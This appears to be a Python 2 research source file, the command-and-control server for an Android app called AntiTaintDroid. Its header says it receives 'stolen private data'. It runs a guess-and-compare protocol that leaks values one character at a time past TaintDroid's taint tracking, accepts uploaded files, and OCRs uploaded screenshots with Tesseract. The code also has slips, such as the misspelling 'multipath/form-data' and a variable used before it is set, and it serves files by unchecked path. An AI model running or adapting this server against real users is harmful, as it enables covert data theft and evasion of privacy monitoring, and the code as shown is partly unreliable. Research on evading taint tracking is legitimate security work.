#!/usr/bin/python
#
#----------------------------------------------------------------
#
#     Title: AntiTaintDroid-Server
#    Author: Babil (Golam Sarwar)
# File-name: antitaintdroid-test-server.py
#
#   Created: March, 2010
#   Version: 0.0.1
#   Purpose: Runs a very simple HTTP server for
#            the AntiTaintDroid app to upload
#            stolen private data.
#   Copyright: 2012-2013, National ICT Australia (NICTA), Golam Sarwar
#   License: GPL2 (see COPYING)
#
# ---------------------------------------------------------------
#

import os
import cgi
import Image
import urlparse
import subprocess
import BaseHTTPServer

bname = "taintshot"
jpg = bname + ".jpg"
tif = bname + ".tif"
txt = bname + ".txt"
rnd = bname + ".rnd"
tess_cmd = ["tesseract", tif, bname, "-l", "eng"]

debug = True
symbols = " 0123456789"
symbols = symbols + "abcdefghijklmnopqrstuvwxyz"
symbols = symbols + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

class Handler(BaseHTTPServer.BaseHTTPRequestHandler):

    def send_TEXT(self, resp_code = 200, text = ""):
        self.send_response(resp_code)
        self.send_header('Content-Type','text/html')
        self.send_header('Content-Length',len(text))
        self.end_headers()
        self.wfile.write(text)


    def do_GET(self):
        q = urlparse.urlparse(self.path).query
        print urlparse.parse_qs(q)

        try:
            if self.path.endswith(".html"):
                f = open(os.curdir + os.sep + self.path)
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
                return
            if self.path.endswith(".jar") or self.path.endswith(".dex") or self.path.endswith(".apk"):
                f = open(os.curdir + os.sep + self.path, 'rb')
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition','attachment;filename=' + self.path.split("/")[-1])
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
                return

            return

        except IOError:
            self.send_error(404,'File Not Found: %s' % self.path)


    def do_POST(self):
        ctype, params = cgi.parse_header(
            self.headers.getheader("content-type"))

        query = cgi.FieldStorage(
            fp = self.rfile,
            headers = self.headers,
            environ = {
            'REQUEST_METHOD':'POST',
            'CONTENT_TYPE':self.headers['Content-Type']
            })


        if self.path.find("logme") >= 0:
            for key in  query.keys():
                q = query[key]

                if q.name == ">>start":
                    taskval = "0"
                    if debug:
                        print "sending", '{<<command:"compare:' + taskval + '"}'
                    self.send_TEXT(200, '{<<command:"compare:' + taskval + '"}')

                if q.name == ">>answer":
                    answer = q.value.split(":")[0]
                    taskval = q.value.split(":")[1]

                    if answer == "false":
			i = 1
                        new_chr = chr(ord(taskval[-1])+i)
			while new_chr not in  symbols:
			    i = i + 1
			    new_chr = chr(ord(taskval[-1])+i)
			taskval = taskval[:-1] + new_chr

                        if debug:
                            print "sending", '{<<command:"compare:' + taskval + '"}'
                        self.send_TEXT(200, '{<<command:"compare:' + taskval + '"}')

                    if answer == "fuzzy":
                        taskval = taskval + " "
                        if debug:
                            print "sending", '{<<command:"compare:' + taskval + '"}'
                        self.send_TEXT(200, '{<<command:"compare:' + taskval + '"}')

                    if answer == "true":
                        self.send_TEXT(200, '{<<command:"--done--:' + taskval + '"}')

                else:
                    self.send_TEXT(200, '{result:"success"}')
                    taskval = ""


            # print ...
            for key in  query.keys():
                q = query[key]
                print q.name, "->", q.value


        if self.path.find("upload") >= 0:
            if ctype == "multipath/form-data":
                query = cgi.parse_multipart(self.rfile, params)
            if ctype == "application/x-www-form-urlencoded":
                length = int(self.headers.getheader("content-length"))
                query = cgi.parse_qs(self.rfile.read(length), keep_blank_values=1)

            for key in  query.keys():
                if key == "file":
                    q = query[key]
                    updata = q.value

            open(rnd, "wb").write(updata)

            if debug: print "file received, %d bytes" % len(updata)
            self.send_TEXT(200, '{result:"success", ocr:"' + out + '"}')


        if self.path.find("ocr") >= 0:
            if ctype == "multipath/form-data":
                query = cgi.parse_multipart(self.rfile, params)
            if ctype == "application/x-www-form-urlencoded":
                length = int(self.headers.getheader("content-length"))
                query = cgi.parse_qs(self.rfile.read(length), keep_blank_values=1)

            for key in  query.keys():
                if key == "image":
                    q = query[key]
                    updata = q.value

            # os.remove(tif)
            # os.remove(txt)
            # os.remove(jpg)

            open(jpg, "wb").write(updata)
            Image.open(jpg).save(tif)

            if debug: print "file received, %d bytes" % len(updata)
            if len(updata) > 0:
                subprocess.call(
                    tess_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT
                )

                out = open(txt).read().strip()
                if debug: print out

            self.send_TEXT(200, '{result:"success", ocr:"' + out + '"}')

        print


def main():
    try:
        import msvcrt
        msvcrt.setmode (0, os.O_BINARY) # stdin  = 0
        msvcrt.setmode (1, os.O_BINARY) # stdout = 1
    except ImportError:
        pass

    try:
        http_port = 8000
        server = BaseHTTPServer.HTTPServer(("", http_port), Handler)
        print "[+] starting server on port %d" % (http_port)
        server.serve_forever()
    except KeyboardInterrupt:
        print "[+] keyboard interrupt"
        server.socket.close()
        print "[+] good-bye!"

if __name__ == '__main__':
    main()

